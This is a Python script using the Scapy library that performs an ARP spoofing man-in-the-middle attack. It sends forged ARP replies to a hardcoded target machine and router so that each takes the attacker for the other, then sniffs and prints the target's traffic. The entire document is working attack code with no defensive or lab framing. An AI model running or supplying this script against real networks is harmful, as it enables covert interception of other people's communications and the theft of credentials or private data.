from scapy.all import *

# Set the IP address of the target and the router
target_ip = "192.168.1.13"
router_ip = "192.168.1.1"

# Get the MAC addresses of the target and the router
target_mac = getmacbyip(target_ip)
router_mac = getmacbyip(router_ip)

# Create ARP packets to spoof the target and the router
target_arp = ARP(op=2, pdst=target_ip, psrc=router_ip, hwdst=target_mac)
router_arp = ARP(op=2, pdst=router_ip, psrc=target_ip, hwdst=router_mac)

# Send the ARP packets to start the ARP spoofing attack
send(target_arp)
send(router_arp)

# Set up a packet sniffing function to intercept traffic
def sniff_packets(packet):
    if packet.haslayer(IP):
        if packet[IP].src == target_ip:
            print("Target sent: " + packet.summary())
        elif packet[IP].dst == target_ip:
            print("Target received: " + packet.summary())

# Start sniffing packets
sniff(prn=sniff_packets, filter="host " + target_ip)